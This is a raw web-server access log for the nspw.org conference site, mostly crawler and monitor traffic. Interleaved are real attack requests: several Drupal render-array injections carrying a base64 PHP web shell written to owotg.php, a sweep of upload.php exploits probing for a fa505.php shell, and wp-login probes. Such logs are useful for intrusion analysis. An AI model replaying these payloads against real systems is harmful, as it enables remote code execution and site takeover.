www.nspw.org:80 181.120.49.185 - - [02/May/2018:18:40:06 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 181.120.49.185 - - [02/May/2018:18:40:08 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:18:40:21 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 157.55.39.141 - - [02/May/2018:18:41:28 -0400] "GET /papers/2005/nspw2005-beznosov.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 207.46.13.1 - - [02/May/2018:18:44:01 -0400] "GET /papers/2005/nspw2005-maxion.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 207.46.13.1 - - [02/May/2018:18:44:31 -0400] "GET /papers/2003/nspw2003-flechais.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 157.55.39.141 - - [02/May/2018:18:44:53 -0400] "GET /papers/1993/nspw1993-rooker-2.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 37.125.63.141 - - [02/May/2018:18:45:12 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 37.125.63.141 - - [02/May/2018:18:45:13 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:18:45:21 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 54.36.148.217 - - [02/May/2018:18:46:13 -0400] "GET /2009/ieee.clo HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 66.249.64.206 - - [02/May/2018:18:48:03 -0400] "GET /papers/1997/nspw1997-riechmann.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 197.89.243.252 - - [02/May/2018:18:48:26 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 197.89.243.252 - - [02/May/2018:18:48:30 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 157.55.39.141 - - [02/May/2018:18:50:00 -0400] "GET /papers/2005/nspw2005-taylor-panel.pdf HTTP/1.1" 302 603 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:18:50:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 71.68.213.113 - - [02/May/2018:18:51:00 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 71.68.213.113 - - [02/May/2018:18:51:01 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.236 - - [02/May/2018:18:53:14 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 54.36.148.220 - - [02/May/2018:18:53:30 -0400] "GET /2005/cfp/CFP.tex HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:18:55:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:18:59:17 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:18:59:17 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:19:00:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 79.3.147.8 - - [02/May/2018:19:03:31 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 79.3.147.8 - - [02/May/2018:19:03:33 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:19:05:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 54.162.22.29 - - [02/May/2018:19:06:40 -0400] "GET /papers/2013/nspw2013-peisert.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; linkdexbot/2.2; +http://www.linkdex.com/bots/)"
www.nspw.org:80 35.226.23.240 - - [02/May/2018:19:07:32 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "ltx71 - (http://ltx71.com/)"
www.nspw.org:80 157.55.39.141 - - [02/May/2018:19:10:01 -0400] "GET /papers/2008/nspw2008-molloy.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:19:10:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.64.208 - - [02/May/2018:19:12:59 -0400] "GET /papers/2009/nspw2009-herley.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 77.75.78.166 - - [02/May/2018:19:13:13 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.166 - - [02/May/2018:19:13:15 -0400] "GET /papers/2011/nspw2011-bicakci.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.166 - - [02/May/2018:19:13:16 -0400] "GET /2003/program.pdf HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.166 - - [02/May/2018:19:13:16 -0400] "GET /2010/organizers HTTP/1.1" 302 558 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.166 - - [02/May/2018:19:13:17 -0400] "GET /2009/sg.txt HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.166 - - [02/May/2018:19:13:17 -0400] "GET /papers/2013/ HTTP/1.1" 302 552 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.166 - - [02/May/2018:19:13:17 -0400] "GET /past HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:19:13:21 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:19:15:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.236 - - [02/May/2018:19:16:45 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 83.216.92.246 - - [02/May/2018:19:19:27 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 83.216.92.246 - - [02/May/2018:19:19:28 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:19:20:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 220.181.125.142 - - [02/May/2018:19:21:19 -0400] "GET /papers/2010/nspw2010-bishop.pdf HTTP/1.1" 302 554 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:19:21:19 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:19:21:27 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 157.55.39.141 - - [02/May/2018:19:23:54 -0400] "GET /papers/2006/nspw2006-gates.pdf HTTP/1.1" 302 589 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 66.249.64.206 - - [02/May/2018:19:24:11 -0400] "GET /current/cfp.shtml HTTP/1.1" 302 563 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:19:25:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:25:38 -0400] "POST /chat/upload.php HTTP/1.1" 302 559 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:25:54 -0400] "GET /chat/temp/fa505.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:26:02 -0400] "POST /Chat/upload.php HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:26:03 -0400] "GET /Chat/temp/fa505.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:26:19 -0400] "POST /en/upload.php HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:26:32 -0400] "GET /en/temp/fa505.php HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:26:32 -0400] "POST /chat/FlashChat_v608/chat/upload.php HTTP/1.1" 302 543 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:26:47 -0400] "GET /chat/FlashChat_v608/chat/temp/fa505.php HTTP/1.1" 302 551 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:26:53 -0400] "POST /radio/radiochat/upload.php HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:19:27:11 -0400] "GET /2008/cfp/?C=S;O=D HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:27:12 -0400] "GET /radio/radiochat/temp/fa505.php HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:27:17 -0400] "POST /websci/radio/radiochat/upload.php HTTP/1.1" 302 539 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:27:18 -0400] "GET /websci/radio/radiochat/temp/fa505.php HTTP/1.1" 302 547 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:19:27:22 -0400] "GET /2006/program.content HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:19:27:38 -0400] "GET /2009/nspw-header.shtml HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:27:40 -0400] "POST /o/BhGCe/forums.e-mpire.com/chat/upload.php HTTP/1.1" 302 557 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:27:40 -0400] "GET /o/BhGCe/forums.e-mpire.com/chat/temp/fa505.php HTTP/1.1" 302 565 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:27:52 -0400] "POST /cms/chat/upload.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:27:52 -0400] "GET /cms/chat/temp/fa505.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:27:59 -0400] "POST /chat/chat/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:28:20 -0400] "GET /chat/chat/temp/fa505.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:28:20 -0400] "POST /Chat/Chat/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:28:21 -0400] "GET /Chat/Chat/temp/fa505.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:28:38 -0400] "POST /live/chat/upload.php HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:28:38 -0400] "GET /live/chat/temp/fa505.php HTTP/1.1" 302 521 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:28:48 -0400] "POST /smf/chat/upload.php HTTP/1.1" 302 511 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:28:58 -0400] "GET /smf/chat/temp/fa505.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:29:01 -0400] "POST /Tchate/flashchat/upload.php HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:29:08 -0400] "GET /Tchate/flashchat/temp/fa505.php HTTP/1.1" 302 535 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:29:08 -0400] "POST /~duchen/chat/upload.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:29:16 -0400] "GET /~duchen/chat/temp/fa505.php HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:19:29:24 -0400] "GET /2002/dates.shtml HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:29:29 -0400] "POST /forum/chat/upload.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:29:36 -0400] "GET /forum/chat/temp/fa505.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:30:00 -0400] "POST /FlashChat_v6.0.8_/chat/upload.php HTTP/1.1" 302 539 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:30:00 -0400] "GET /FlashChat_v6.0.8_/chat/temp/fa505.php HTTP/1.1" 302 547 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:30:07 -0400] "POST /flashchat/chat/upload.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:19:30:18 -0400] "GET /2005/cfp/?C=S;O=A HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:30:19 -0400] "GET /flashchat/chat/temp/fa505.php HTTP/1.1" 302 531 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 69.162.124.227 - - [02/May/2018:19:30:20 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:30:46 -0400] "POST /social/upload.php HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:30:49 -0400] "GET /social/temp/fa505.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:31:07 -0400] "POST /sohbet/upload.php HTTP/1.1" 302 507 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:31:36 -0400] "GET /sohbet/temp/fa505.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 59.124.153.166 - - [02/May/2018:19:31:40 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:31:53 -0400] "POST /e-dinar-chat/upload.php HTTP/1.1" 302 519 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:32:03 -0400] "GET /e-dinar-chat/temp/fa505.php HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:32:20 -0400] "POST /forums/chat/upload.php HTTP/1.1" 302 517 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:32:33 -0400] "GET /forums/chat/temp/fa505.php HTTP/1.1" 302 525 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:19:32:38 -0400] "GET /2009/proceedings/?C=M;O=D HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:32:43 -0400] "POST /chat-stjepkovica/upload.php HTTP/1.1" 302 527 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:19:32:49 -0400] "GET /2009/proceedings/1993/?C=D;O=D HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 207.46.13.179 - - [02/May/2018:19:32:56 -0400] "GET /papers/2009/nspw2009-jakobsson.pdf HTTP/1.1" 302 597 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:32:57 -0400] "GET /chat-stjepkovica/temp/fa505.php HTTP/1.1" 302 535 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:19:32:59 -0400] "GET /2009/proceedings/1994/?C=N;O=D HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:33:12 -0400] "POST /community/chat/upload.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:33:12 -0400] "GET /community/chat/temp/fa505.php HTTP/1.1" 302 531 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:19:33:12 -0400] "GET /2009/proceedings/1994/?C=D;O=A HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:33:33 -0400] "POST /board/chat/upload.php HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:33:54 -0400] "GET /board/chat/temp/fa505.php HTTP/1.1" 302 523 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:34:10 -0400] "POST /roommate/flash_chat/upload.php HTTP/1.1" 302 533 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:34:36 -0400] "GET /roommate/flash_chat/temp/fa505.php HTTP/1.1" 302 541 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 216.244.66.200 - - [02/May/2018:19:34:41 -0400] "GET /2011 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:34:53 -0400] "POST /e107_plugins/onlineinfo_menuupload.php HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
www.nspw.org:80 72.11.140.74 - - [02/May/2018:19:35:00 -0400] "GET /e107_plugins/onlineinfo_menutemp/fa505.php HTTP/1.1" 302 557 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
